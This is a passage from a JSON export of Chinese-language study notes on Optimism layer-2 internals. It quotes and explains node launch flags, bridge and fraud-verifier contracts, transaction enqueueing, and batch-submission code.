 --nodiscover   --maxpeers=0   --networkid=42069   --authrpc.vhosts=&quot;*&quot;   --authrpc.addr=0.0.0.0   --authrpc.port=8551   --authrpc.jwtsecret=./jwt.txt   --rollup.disabletxpoolgossip=true   --password=./datadir/password   --allow-insecure-unlock   --mine   --miner.etherbase=$SEQ_ADDR   --unlock=$SEQ_ADDR\nop-node\n./bin/op-node \\\n\t--l2=http://localhost:8551 \\\n\t--l2.jwt-secret=./jwt.txt \\\n\t--sequencer.enabled \\\n\t--sequencer.l1-confs=3 \\\n\t--verifier.l1-confs=3 \\\n\t--rollup.config=./rollup.json \\\n\t--rpc.addr=0.0.0.0 \\\n\t--rpc.port=8547 \\\n\t--p2p.disable \\\n\t--rpc.enable-admin \\\n\t--p2p.sequencer.key=$SEQ_KEY \\\n\t--l1=$L1_RPC \\\n\t--l1.rpckind=$RPC_KIND"},"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/ovm操作":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/ovm操作","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/ovm操作.md","title":"ovm操作","links":[],"tags":[],"content":"在我们有了沙箱 OVM，我们需要将智能合约编译为 OVM 字节码。以下是我们的一些选择：\n\n创建一种可编译为 OVM 的新智能合约语言：一种新的智能合约语言是一个很容易被忽略的想法，因为它需要从头开始重新做所有事情，我们已经同意我们不会在这里这样做。\n将 EVM 字节码转译为 OVM 字节码：曾尝试过但由于复杂性而放弃。\n通过修改编译器以生成 OVM 字节码来支持 Solidity 和 Vyper。\n\n\nresearch.paradigm.xyz/optimism\n\ngithub.com/ethereum-optimism/solidity/blob/df005f39493525b43f1153dff8da5910a2b83e34/libsolidity/codegen/CompilerContext.cpp#L64-L367"},"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/sequencer源码":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/sequencer源码","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/sequencer源码.md","title":"sequencer源码","links":[],"tags":[],"content":""},"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/关于optimism的一些架构想法":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/关于optimism的一些架构想法","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/关于optimism的一些架构想法.md","title":"关于optimism的一些架构想法","links":[],"tags":[],"content":""},"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/总体介绍与资源":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/总体介绍与资源","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/总体介绍与资源.md","title":"总体介绍与资源","links":[],"tags":[],"content":"medium.com/@quentangle/optimism%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E8%AF%A6%E8%A7%A3-fbc441764425\ntwitter.com/quentangle_\nresearch.paradigm.xyz/optimism\nwww.alchemy.com/overviews/optimistic-rollups\ngodorz.info/2022/04/optimism-notes/\nblog.csdn.net/shangsongwww/article/details/119274785\nwww.cnblogs.com/linguanh/p/16535408.html\n![image-20230223162738841](/Users/carver/Library/Application Support/typora-user-images/image-20230223162738841.png)\nwww.helloworld.net/p/0748466805  重点看\n什么是乐观的rollup\n链外处理txns,可以从以下节省：\n\n数据压缩：一个批次所占用的空间比单独的txns堆叠在一起要少。原因\n\noptimism 认为L2提交上来的新状态，L1 是不需要验证的，如果验证他会浪费很多计算，失去了rollup意义（核心）\n所以他们将新提交的批次锁定一个星期（挑战窗口期，这是个优化点，1个星期太久了，为什么挑战期需要这么久🚩）， 任何人（无门槛）可以在这个窗口期提交数学证明，如果发现了欺诈就可以获得奖励（提交批次的人存入的钱，必须存才有资格提交），若是没有争议，就是最终结果。\noptimism 组件\nL1：\n\nCanonicalTransactionChain\nStateCommitmentChain\nCrossDomainManager\n\nL2：\n\nSequencer (optimism \t)\nbatch-submitter\n\n出于 data availability(这里是否可以尝试替换为DA解决方案🚩)，把交易按敲定的顺序，序列化后作为 calldata 提交到 L1\n\n\nCrossDomainManager\n\nData-transport-layer\n索引 L1 事件，并存储到数据库中\n\nTransactionEnqueued\nSequencerBatchAppended\nStateBatchAppended\n\n对于 L1→L2 交易，还将建立引用 index ←&gt; queueIndex\nSequencer 向它查询待执行的 L1→L2 交易\nrealyer:\n实时监控已过挑战期的 L2→L1 交易，在 L1 上调用合约完成中继 ,未找到代码🚩\noptimism 合约组成\nL1和L2移动资金的双向桥梁\n===========L1 bridge\n===========L2 bridge\n\n原理：锁定L1的资金，并在L2上铸造等值资金。提取资金时，桥要烧掉L2的资金并释放锁定的L1资金\n\n跨域信息传递\nL1和L2之间的通信是通过一个跨域信使合约进行的（L1、L2上都有一个副本）。在内部这个合约存储消息，并依靠 “中继器relayers”来通知另一个链（L1或L2）有新消息\n\n不存在原生的L1→←通信，每一方都有relayMessage这样的函数， 中继器应该使用传统的web2 HTTP来调用它们\n\n处理交易并rollup\n其角色是sequencer（目前是中心化的，去中心化或者分布式的应该更好，避免单点故障问题🚩） ，主要代码就是L2Geth， 他就是专门接收L2交易。将状态更新作为一个待定区块应用到其本地状态。这些待处理区块会定期大批量地提交给以太坊（L1上的规范链合约）进行最终处理。\n在以太坊上接受这些批次的功能是appendSequencerBatch，这是L1上CanonicalTransactionChain合约的一部分。在内部，appendSequencerBatch使用下面的函数来处理批次。他会存储批量交易，这个里面的数据是后面处理争端的证明数据，需要理解下怎么工作的🚩\n处理纠纷的状态更新\n争端的工作方式是提交一个状态更新无效的证明，并根据存储的状态更新（存储的批次元数据：哈希和上下文）验证这个证明。\n负责处理纠纷的合约是OVMFraudVerifier。该合约是OVM — Optimism虚拟机（类似于EVM — Ethereum虚拟机）的一部分\n这个合约我并没有搜到\ncontract OVM_FraudVerifier is Lib_AddressResolver, OVM_FraudContributor, iOVM_FraudVerifier {\n    /**\n     * 最终完成欺诈验证过程。\n     * @param _preStateRoot 欺诈交易前的状态根。\n     * @param _preStateRootBatchHeader 所提供的前状态根的批次头。\n     * @param _preStateRootProof 为所提供的前状态根的包容证明。\n     * @param _txHash 状态根的交易\n     * @param _postStateRoot 欺诈性交易后的状态根。\n     * @param _postStateRootBatchHeader 所提供的后状态根的批次头。\n     * @param _postStateRootProof 为所提供的后状态根的包容证明。\n     */\n    function finalizeFraudVerification(\n        bytes32 _preStateRoot,\n        Lib_OVMCodec.ChainBatchHeader memory _preStateRootBatchHeader,\n        Lib_OVMCodec.ChainInclusionProof memory _preStateRootProof,\n        bytes32 _txHash,\n        bytes32 _postStateRoot,\n        Lib_OVMCodec.ChainBatchHeader memory _postStateRootBatchHeader,\n        Lib_OVMCodec.ChainInclusionProof memory _postStateRootProof\n    )\n        override\n        public\n        contributesToFraudProof(_preStateRoot, _txHash)\n    {\n        iOVM_StateTransitioner transitioner = getStateTransitioner(_preStateRoot, _txHash);\n        \n        // ... a bunch of require statements omitted\n \n        // If the post state root did not match, then there was fraud and we should delete the batch\n        require(\n            _postStateRoot != transitioner.getPostStateRoot(),\n            &quot;State transition has not been proven fraudulent.&quot;\n        );\n        \n        _cancelStateTransition(_postStateRootBatchHeader, _preStateRoot);\n \n        // TEMPORARY: Remove the transitioner; for minnet.\n        transitioners[keccak256(abi.encodePacked(_preStateRoot, _txHash))] = iOVM_StateTransitioner(0x0000000000000000000000000000000000000000);\n \n        emit FraudProofFinalized(\n            _preStateRoot,\n            _preStateRootProof.index,\n            _txHash,\n            msg.sender\n        );\n    }\n    \n    /**\n     * 从状态承诺链中删除一个状态转换。\n     * @param _postStateRootBatchHeader 后状态根的头。\n     * @param _preStateRoot 前状态根的哈希值。\n     */\n    function _cancelStateTransition(\n        Lib_OVMCodec.ChainBatchHeader memory _postStateRootBatchHeader,\n        bytes32 _preStateRoot\n    )\n        internal\n    {\n        iOVM_StateCommitmentChain ovmStateCommitmentChain = iOVM_StateCommitmentChain(resolve(&quot;OVM_StateCommitmentChain&quot;));\n        iOVM_BondManager ovmBondManager = iOVM_BondManager(resolve(&quot;OVM_BondManager&quot;));\n \n        // Delete the state batch.\n        ovmStateCommitmentChain.deleteStateBatch(\n            _postStateRootBatchHeader\n        );\n \n        // Get the timestamp and publisher for that block.\n        (uint256 timestamp, address publisher) = abi.decode(_postStateRootBatchHeader.extraData, (uint256, address));\n \n        // Slash the bonds at the bond manager.\n        ovmBondManager.finalize(\n            _preStateRoot,\n            publisher,\n            timestamp\n        );\n    }\n}\n\nfinalizeFraudVerification检查_postStateRoot（由验证者提交）是否与排序器提交的root不一致。\n如果不一致，那么我们就在_cancelStateTransition中删除该批次，并削减排序者的存款（为了成为一个排序器，你需要锁定一个存款。当你提交一个欺诈性的批次时，你的押金就会被削减，这些钱就会给验证者，作为保持整个机制运行的激励）。\n\nrollup交易\n欺诈证明\nOVM\n参考"},"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/整体理解":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/整体理解","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/整体理解.md","title":"整体理解","links":[],"tags":[],"content":"组件\nop-batcher\n\n将交易压缩成batchs\n将batches发布到L1确保可用性和完整性\n\nop-geth\n\n修改并存储状态\n处理交易，更改状态\n\nop-proposer\nState root commitments 由op-proposer 提出到L1上的L2outputOracle合约， 这个提案不会立即生效，需要经过挑战期\nstack.optimism.io/docs/build/"},"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/标准桥":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/标准桥","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/标准桥.md","title":"标准桥","links":[],"tags":[],"content":"\n\n\noptimism 标准桥 提供两个网络之间移动资产，比如L1存入100美元C，来换取L2上100美元C，\n\n\n需要授权给标准桥来存入ERC20\n\n\n标准网桥只能与在Optimism上正确配置了ERC-20版本的令牌一起使用。如果您将任何其他类型的令牌直接发送到标准网桥（不使用用户界面或API），它就会被卡住，从而失去该值。token查看地址，有optimismBridgeAddress才可以使用此标准桥\n\n\n在令牌列表中存在可以选择使用optimism标准网桥或者使用其他不同的网桥，提现在extensions.optimismBridgeAddress值不同。\n\n\n\nIL1ERC20Bridge\n // 获取对应的L2网桥合约的地址\n function l2TokenBridge() external returns (address);\n \n // 将ERC20的一部分存入caller在L2上的余额 \n function depositERC20(\n   address _l1Token, // 我们存放的L1 ERC20的地址\n   address _l2Token, // L1各自的L2 ERC20的地址\n   uint256 _amount,  // ERC20存款金额\n   uint32 _l2Gas,    // 完成 L2上的存款所需的气体限额\n   bytes calldata _data // 要转发到L2的可选数据 🚩 外部调用传递的什么数据\n ) external;\n \n // 将一笔 ERC20存入接受者在 L2上的余额\n function depositERC20To(\n   address _l1Token,\n   address _l2Token,\n   address _to,  // 将取款记入贷方的L2地址\n   uint256 _amount,\n   uint32 _l2Gas,\n   bytes calldata _data\n   ) external;\n    \n  // 完成从L2到L1的取款，并将资金记入L1 ERC20代币的接收者余额\n\tfunction finalizeERC20Withdrawal(\n    address _l1Token, // 要终结的L1令牌的地址\n    address _l2Token, // 开始提款的 L2令牌地址\n    address _from,    // 启动传输的L2地址\n    address _to,      // 将取款记入贷方的L1地址。\n    uint256 _amount,  // 要存入的ERC20金额\n    bytes calldata _data // 发送方在L2上提供的数据\n  ) external;\nL1StandardBridge\n\n标准桥的L1部分。负责完成L2的取款，并向ETH和符合ERC20的L2发起存款，支持ETH和ETH上的ERC20\n\n从L1存入金额到L2\n存入金额调用的是depositETH，这里的calldata🚩, 在存入的时候L1桥合约会记录L1地址映射到L2地址所存入的金额.\nQA： 为什么需要地址别名\n\ncommunity.optimism.io/docs/developers/build/differences/#using-eth-in-contracts\ncommunity.optimism.io/docs/developers/build/differences/#accessing-the-latest-l1-block-number\n\nQA : l2gas 是如何获取L2上的gas的\nQA ： finalizeDeposit传输零地址的意思\n  // 将L1令牌映射到L2令牌，以存储L1令牌的余额\n  mapping(address =&gt; mapping(address =&gt; uint256)) public deposits;\n  \n function depositETH(uint32 _l2Gas, bytes calldata _data) external payable onlyEOA {\n        _initiateETHDeposit(msg.sender, msg.sender, _l2Gas, _data);\n    }\n    \nfunction _initiateETHDeposit(\n        address _from,\n        address _to,\n        uint32 _l2Gas,\n        bytes memory _data\n    ) internal {\n        // 存入ETH和存入ERC20是不一样的参数传递， 存入ETH， _l2Token 永远是OVM_ETH地址\n        // _l1Token 永远是 address(0)\n        bytes memory message = abi.encodeWithSelector(\n            IL2ERC20Bridge.finalizeDeposit.selector,\n            address(0),\n            Lib_PredeployAddresses.OVM_ETH,\n            _from,      // 从L1提取存款的帐户 msg.sender\n            _to,        // L2上的存款账户    msg.sender  🚩这个账户地址难道不会和L1一样，但是属于不同人创建的？ 除非这条链不支持创建账户，不然这钱不就有第二个人知道了？\n            msg.value,\n            _data\n        );\n \n        // Send calldata into L2\n        // slither-disable-next-line reentrancy-events\n        sendCrossDomainMessage(l2TokenBridge, _l2Gas, message);\n \n        // slither-disable-next-line reentrancy-events\n        emit ETHDepositInitiated(_from, _to, msg.value, _data);\n    }\n \nIL2ERC20Bridge.finalizeDeposit.selector 设置了一个L2会调用的函数 finalizeDeposit:\nfinalizeDeposit 完成从L1到L2的存款，并将资金记入该L2代币的接收者余额。如果该调用不是来自L1StandardTokenBridge中的相应存款，则该调用将失败。 \n这个只能 跨链账户去调用,将相同数量的金额存入到L2的账户\nfunction finalizeDeposit(\n        address _l1Token,  // 用于调用的l1令牌的地址\n        address _l2Token,  // 用于调用的l2令牌的地址\n        address _from,     // 从L2提取存款的帐户。\n        address _to,       // 接收取款的地址\n        uint256 _amount,\n        bytes calldata _data\n    ) external;\n到了这里实际是L1的合约跨链调用L2 的合约， sendCrossDomainMessage(l2TokenBridge, _l2Gas, message);，调用的CrossDomainEnabled（专门做跨链消息传送的合约）\n// L1StandardBridge\n// Send calldata into L2\nsendCrossDomainMessage(l2TokenBridge, _l2Gas, message);\n \nfunction sendCrossDomainMessage(\n        address _crossDomainTarget,  // l2TokenBridge地址\n        uint32 _gasLimit,\n        bytes memory _message\n    ) internal {\n        getCrossDomainMessenger().sendMessage(_crossDomainTarget, _message, _gasLimit);\n    }\n其实到这里，组装了一个调用消息，是让L2去调用自己的方法，包括L2的合约地址，L2gas和L2的ABI信息（传入了L1的参数），\n最终会把组装的调用消息交给跨链合约。\n跨链合约主要做了以下事情：\n\n将CTC队列目前长度作为nonce\n构造跨链calldata（编码的跨链da ta中的m s g.sender应该是L1桥的地址）\n**发送跨链消息（最终出口）**给CanonicalTransactionChain（L1上的合约） 合约， 同时会将此消息存储在CanonicalTransactionChain合约上通过enqueue，这样L1上的工作完成，L1保存了这个消息，同时触发事件SentMessage（L1CrossDomainMessanger.sol）, 谁会去做监听？？？？\n\nenqueue 会将整个L1存入token的一连串的数据包括发送者，L2目标token合约，交易data keccak256作为一笔交易以及时间戳和当前区块打包成Elements存入CanonicalTransactionChain，并触发TransactionEnqueued事件（此事件由DTL监听）\n\n\novmCanonicalTransactionChain（预先部署） 合约地址：0x4200000000000000000000000000000000000007\n\n// L1CrossDomainMessenger.sol\nfunction sendMessage(\n        address _target,\n        bytes memory _message,\n        uint32 _gasLimit\n    ) public {\n        address ovmCanonicalTransactionChain = resolve(&quot;CanonicalTransactionChain&quot;);\n        // Use the CTC queue length as nonce\n        uint40 nonce = ICanonicalTransactionChain(ovmCanonicalTransactionChain).getQueueLength();\n \n        bytes memory xDomainCalldata = Lib_CrossDomainUtils.encodeXDomainCalldata(\n            _target, // L2tokenBridge\n            msg.sender,  // ？是否是DomainMessenger\n            _message,  // 存款消息\n            nonce\n        );\n \n        _sendXDomainMessage(ovmCanonicalTransactionChain, xDomainCalldata, _gasLimit);\n        \n        emit SentMessage(_target, msg.sender, _message, nonce, _gasLimit);\n    }\n    function _sendXDomainMessage(\n        address _canonicalTransactionChain,\n        bytes memory _message,\n        uint256 _gasLimit\n    ) internal {\n        ICanonicalTransactionChain(_canonicalTransactionChain).enqueue(\n            Lib_PredeployAddresses.L2_CROSS_DOMAIN_MESSENGER, // 将交易发送到的目标L2合同\n            _gasLimit,\n            _message\n        );\n    }\n将一笔交易添加到队列：\n\ncalldata的数据不要大于50000字节\nL2 tx gas 相关最大100000\n触发 TransactionEnqueued事件\n\n    function enqueue(\n        address _target,\n        uint256 _gasLimit,\n        bytes memory _data\n    ) external {\n        require(\n            _data.length &lt;= MAX_ROLLUP_TX_SIZE,\n            &quot;Transaction data size exceeds maximum for rollup transaction.&quot;\n        );\n \n        require(\n            _gasLimit &lt;= maxTransactionGasLimit,\n            &quot;Transaction gas limit exceeds maximum for rollup transaction.&quot;\n        );\n \n        require(_gasLimit &gt;= MIN_ROLLUP_TX_GAS, &quot;Transaction gas limit too low to enqueue.&quot;);\n \n        if (_gasLimit &gt; enqueueL2GasPrepaid) {\n            uint256 gasToConsume = (_gasLimit - enqueueL2GasPrepaid) / l2GasDiscountDivisor;\n            uint256 startingGas = gasleft();\n            require(startingGas &gt; gasToConsume, &quot;Insufficient gas for L2 rate limiting burn.&quot;);\n \n            uint256 i;\n            while (startingGas - gasleft() &lt; gasToConsume) {\n                i++;\n            }\n        }\n        address sender;\n        if (msg.sender == tx.origin) {\n            sender = msg.sender;\n        } else {\n            sender = AddressAliasHelper.applyL1ToL2Alias(msg.sender);\n        }\n \n        bytes32 transactionHash = keccak256(abi.encode(sender, _target, _gasLimit, _data));\n \n        queueElements.push(\n            Lib_OVMCodec.QueueElement({\n                transactionHash: transactionHash,\n                timestamp: uint40(block.timestamp),\n                blockNumber: uint40(block.number)\n            })\n        );\n        uint256 queueIndex = queueElements.length - 1;\n        emit TransactionEnqueued(sender, _target, _gasLimit, _data, queueIndex, block.timestamp);\n    }\n \nDTL组件是由typescript写的，TransactionEnqueued事件的处理如下,会解析事件并查出calldata,写入数据库\nexport const handleEventsTransactionEnqueued: EventHandlerSet&lt;\n  TransactionEnqueuedEvent,\n  null,\n  EnqueueEntry\n&gt; = {\n  getExtraData: async () =&gt; {\n    return null\n  },\n  parseEvent: (event) =&gt; {\n    return {\n      index: event.args._queueIndex.toNumber(),\n      target: event.args._target,\n      data: event.args._data,\n      gasLimit: event.args._gasLimit.toString(),\n      origin: event.args._l1TxOrigin,\n      blockNumber: BigNumber.from(event.blockNumber).toNumber(),\n      timestamp: event.args._timestamp.toNumber(),\n      ctcIndex: null,\n    }\n  },\n  storeEvent: async (entry, db) =&gt; {\n    ...\n    await db.putEnqueueEntries([entry])\n  },\n}\n接着就是L2geth(sequencer)从DTL同步TransactionEnqueued 事件，转为交易并执行,这部分在L2geth/rollup/sync_service下面，专门由SequencerLoop执行\nL2geth 里面存储着一个rollupclient,用来对DTL进行Http请求的。请求注册的路由在DTL/service.ts\n//SequencerLoop 是在 sequencer 模式下运行的轮询循环。它排序\n//交易，然后更新 EthContext。\n \nfunc (s *SyncService) SequencerLoop() {\n  ...\n\ts.sequence();\n  ...\n}\n执行交易主要由s.applyTransaction(tx)实现，会调用applyIndexedTransaction，交易的来源是指L1 batch，或者是sequencer同步DTL中的Transactionenqueued事件的交易。\nfunc (s *SyncService) syncQueueTransactionRange(start, end uint64) error {\n\tlog.Info(&quot;Syncing enqueue transactions range&quot;, &quot;start&quot;, start, &quot;end&quot;, end)\n\tfor i := start; i &lt;= end; i++ {\n\t\ttx, err := s.client.GetEnqueue(i)\n\t\tif err != nil {\n\t\t\treturn fmt.Errorf(&quot;Canot get enqueue transaction; %w&quot;, err)\n\t\t}\n\t\tif err := s.applyTransaction(tx); err != nil {\n\t\t\treturn fmt.Errorf(&quot;Cannot apply transaction: %w&quot;, err)\n\t\t}\n\t}\n\treturn nil\n}\napplyTransaction 最终会将交易发到ch:\ns.txFeed.Send(core.NewTxsEvent{\n\t\tTxs:   txs,\n\t\tErrCh: errCh,\n\t})\ncase ev := &lt;-w.rollupCh:\n\t\t...\t\t\t\t\n\t\tif err := w.commitNewTx(tx); err == nil {\n\t\t...\ncommitNewTx（提交单个交易DTL扫的交易）→applyTransaction→applyMessage→evm执行→writeBlockWithState ，sequencer是通过POA共识的。最终挖出一个L2的区块并写入数据库。同时移除了w.chainHeadCh提交挖矿任务，这样只能通过执行同步服务从DTL拉过来的交易和用户发给sequencer的交易来执行生成L2 block .同时注意到把TransactionMeta也记录到state db去了。\n🚩这里关于L1到L2的消息如何转换成l2交易的具体过程,是需要详细解释的，这才是比较关键的一步\nbatch-submitter 监听L2区块，会打包txBatch 提交到L1合约,首先会一直判断是否有L2block更新：\nstart, end, err := s.cfg.Driver.GetBatchBlockRange(s.ctx)\n接着会通过CraftBatchTx使用给定的nonce将开始和结束之间的L2块转换为批处理交易。在生成的交易中使用虚拟天然气价格，以用于规模估计。\ntx, err := s.cfg.Driver.CraftBatchTx(\n\t\t\t\ts.ctx, start, end, nonce,\n\t\t\t)\n批处理交易转换完成了之后还是会调用，batch-submitter会使用L1的客户端去发送这笔交易:\ntx, err := d.rawCtcContract.RawTransact(opts, calldata)\n \nfunc (c *BoundContract) transact(opts *TransactOpts, contract *common.Address, input []byte) (*types.Transaction, error) {\n\tvar err error\n \n\t// Ensure a valid value field and resolve the account nonce\n\tvalue := opts.Value\n\tif value == nil {\n\t\tvalue = new(big.Int)\n\t}\n\tvar nonce uint64\n\tif opts.Nonce == nil {\n\t\tnonce, err = c.transactor.PendingNonceAt(ensureContext(opts.Context), opts.From)\n\t\tif err != nil {\n\t\t\treturn nil, fmt.Errorf(&quot;failed to retrieve account nonce: %v&quot;, err)\n\t\t}\n\t} else {\n\t\tnonce = opts.Nonce.Uint64()\n\t}\n\t// Figure out reasonable gas price values\n\tif opts.GasPrice != nil &amp;&amp; (opts.GasFeeCap != nil || opts.GasTipCap != nil) {\n\t\treturn nil, errors.New(&quot;both gasPrice and (maxFeePerGas or maxPriorityFeePerGas) specified&quot;)\n\t}\n\thead, err := c.transactor.HeaderByNumber(ensureContext(opts.Context), nil)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tif head.BaseFee != nil &amp;&amp; opts.GasPrice == nil {\n\t\tif opts.GasTipCap == nil {\n\t\t\ttip, err := c.transactor.SuggestGasTipCap(ensureContext(opts.Context))\n\t\t\tif err != nil {\n\t\t\t\treturn nil, err\n\t\t\t}\n\t\t\topts.GasTipCap = tip\n\t\t}\n\t\tif opts.GasFeeCap == nil {\n\t\t\tgasFeeCap := new(big.Int).Add(\n\t\t\t\topts.GasTipCap,\n\t\t\t\tnew(big.Int).Mul(head.BaseFee, big.NewInt(2)),\n\t\t\t)\n\t\t\topts.GasFeeCap = gasFeeCap\n\t\t}\n\t\tif opts.GasFeeCap.Cmp(opts.GasTipCap) &lt; 0 {\n\t\t\treturn nil, fmt.Errorf(&quot;maxFeePerGas (%v) &lt; maxPriorityFeePerGas (%v)&quot;, opts.GasFeeCap, opts.GasTipCap)\n\t\t}\n\t} else {\n\t\tif opts.GasFeeCap != nil || opts.GasTipCap != nil {\n\t\t\treturn nil, errors.New(&quot;maxFeePerGas or maxPriorityFeePerGas specified but london is not active yet&quot;)\n\t\t}\n\t\tif opts.GasPrice == nil {\n\t\t\tprice, err := c.transactor.SuggestGasPrice(ensureContext(opts.Context))\n\t\t\tif err != nil {\n\t\t\t\treturn nil, err\n\t\t\t}\n\t\t\topts.GasPrice = price\n\t\t}\n\t}\n\tgasLimit := opts.GasLimit\n\tif gasLimit == 0 {\n\t\t// Gas estimation cannot succeed without code for method invocations\n\t\tif contract != nil {\n\t\t\tif code, err := c.transactor.PendingCodeAt(ensureContext(opts.Context), c.address); err != nil {\n\t\t\t\treturn nil, err\n\t\t\t} else if len(code) == 0 {\n\t\t\t\treturn nil, ErrNoCode\n\t\t\t}\n\t\t}\n\t\t// If the contract surely has code (or code is not needed), estimate the transaction\n\t\tmsg := ethereum.CallMsg{From: opts.From, To: contract, GasPrice: opts.GasPrice, GasTipCap: opts.GasTipCap, GasFeeCap: opts.GasFeeCap, Value: value, Data: input}\n\t\tgasLimit, err = c.transactor.EstimateGas(ensureContext(opts.Context), msg)\n\t\tif err != nil {\n\t\t\treturn nil, fmt.Errorf(&quot;failed to estimate gas needed: %v&quot;, err)\n\t\t}\n\t}\n\t// Create the transaction, sign it and schedule it for execution\n\tvar rawTx *types.Transaction\n\tif opts.GasFeeCap == nil {\n\t\tbaseTx := &amp;types.LegacyTx{\n\t\t\tNonce:    nonce,\n\t\t\tGasPrice: opts.GasPrice,\n\t\t\tGas:      gasLimit,\n\t\t\tValue:    value,\n\t\t\tData:     input,\n\t\t}\n\t\tif contract != nil {\n\t\t\tbaseTx.To = &amp;c.address\n\t\t}\n\t\trawTx = types.NewTx(baseTx)\n\t} else {\n\t\tbaseTx := &amp;types.DynamicFeeTx{\n\t\t\tNonce:     nonce,\n\t\t\tGasFeeCap: opts.GasFeeCap,\n\t\t\tGasTipCap: opts.GasTipCap,\n\t\t\tGas:       gasLimit,\n\t\t\tValue:     value,\n\t\t\tData:      input,\n\t\t}\n\t\tif contract != nil {\n\t\t\tbaseTx.To = &amp;c.address\n\t\t}\n\t\trawTx = types.NewTx(baseTx)\n\t}\n\tif opts.Signer == nil {\n\t\treturn nil, errors.New(&quot;no signer to authorize the transaction with&quot;)\n\t}\n\tsignedTx, err := opts.Signer(opts.From, rawTx)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tif opts.NoSend {\n\t\treturn signedTx, nil\n\t}\n\tif err := c.transactor.SendTransaction(ensureContext(opts.Context), signedTx); err != nil {\n\t\treturn nil, err\n\t}\n\treturn signedTx, nil\n}\n实际就是通过连接的L1客户端去调用绑定的CTC合约（CanonicalTransactionChain.appendSequencerBatch()）这个函数，然后触发TransactionBatchSubmitter事件，DTL再监听这个事件并存储。appendStateBatch() 也是一样（但是这个都是实现的CraftBatchTx接口，到底是调哪一个，还是都调用），这两个函数分别对应ChainStorageContainer和StateCommitmentChain合约\n从L1存款ERC20到L2\n当L1上开始存款时，L1桥将资金转移到自己(L1标准桥合约中)，同时合约会记录L1 → L2金额的映射，以备将来取款\n不管是存ETH还是存ERC20，都会触发TransactionEnqueued事件，DTL层会定期扫L1的区块，获取这个事件并存储到levelDB\n从L2提款到L1\n参考\n\n[1] : optimism浏览器合约\n[2] : 详细合约\n[3] : 标准桥文档\n[4] : tx.origin\n[5] : 源码分析\n[6] : 数据可用性\n[7] : 多方门限签名\n\n"},"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/死磕optimism之L2区块派生":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/死磕optimism之L2区块派生","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism源码分析/死磕optimism之L2区块派生.md","title":"死磕optimism之L2区块派生","links":[],"tags":[],"content":"RunNextSequencerAction\n\n\nd.StartBuildingBlock(ctx)\n\n\nd.l1OriginSelector.FindL1Origin ，找出在需要在哪个L1块上构建，要么是l2Head.L1Origin，要么是l2Head.L1Origin+1\n\n\nd.attrBuilder.PreparePayloadAttributes(fetchCtx, l2Head, l1Origin.ID())\n\nba.l2.SystemConfigByL2Hash(ctx, l2Parent.Hash)， 从上个L2区块中获取到L1info信息并将其转为SystemConfig（rollup 配置）， 这个可以通过 L1 系统配置事件进行更改\n\ntype SystemConfig struct {\n\t// BatcherAddr identifies the batch-sender address used in batch-inbox data-transaction filtering.\n\tBatcherAddr common.Address `json:&quot;batcherAddr&quot;`\n\t// Overhead identifies the L1 fee overhead, and is passed through opaquely to op-geth.\n\tOverhead Bytes32 `json:&quot;overhead&quot;`\n\t// Scalar identifies the L1 fee scalar, and is passed through opaquely to op-geth.\n\tScalar Bytes32 `json:&quot;scalar&quot;`\n\t// GasLimit identifies the L2 block gas limit\n\tGasLimit uint64 `json:&quot;gasLimit&quot;`\n\t// More fields can be added for future SystemConfig versions.\n}\n\n\n组装序列化的 L1-info 属性事务，这必须是L2区块的第一笔交易,下面就是完整的payload属性\neth.PayloadAttributes{\n\t\tTimestamp:             hexutil.Uint64(nextL2Time),\n\t\tPrevRandao:            eth.Bytes32(l1Info.MixDigest()),\n\t\tSuggestedFeeRecipient: predeploys.SequencerFeeVaultAddr, // TODO \n\t\tTransactions:          txs,\n\t\tNoTxPool:              true,\n\t\tGasLimit:              (*eth.Uint64Quantity)(&amp;sysConfig.GasLimit),\n\t}\n\n\n判断新区块的L1Origin是否和上一个区块的不同。如果不同,说明进入了新的L1 epoch。\n\n\n如果进入新的epoch,需要从L1获取该区块的所有交易收据(receipts),扫描里面的用户存款事件。\n\n\n同时更新系统配置(sysConfig)。\n\n\n如果L1Origin没有变化,则复用上一个区块的信息,序列号+1。\n\n\n在任何情况下,都需要验证新区块的L1Origin必须与epoch的hash匹配,不能冲突。\n\n\n其中有段代码：根据扫描了L1的log ，根据topic 对照此 TransactionDeposited(address,address,uint256,bytes) 函数选择器，将其unmarshal 出来并转成depositTx ,详细的信息被解析出来后，需要在L2执行，算是质押交易的下半段内容（这是如何做到原子性的 TODO），如果有L1区块收据里有系统更新的就把信息更新到sysCfg\nDeriveDeposits(receipts, ba.cfg.DepositContractAddress)\n \nfunc UserDeposits(receipts []*types.Receipt, depositContractAddr common.Address) ([]*types.DepositTx, error) {\n\tvar out []*types.DepositTx\n\tvar result error\n\tfor i, rec := range receipts {\n\t\tif rec.Status != types.ReceiptStatusSuccessful {\n\t\t\tcontinue\n\t\t}\n\t\tfor j, log := range rec.Logs {\n\t\t\tif log.Address == depositContractAddr &amp;&amp; len(log.Topics) &gt; 0 &amp;&amp; log.Topics[0] == DepositEventABIHash {\n\t\t\t\tdep, err := 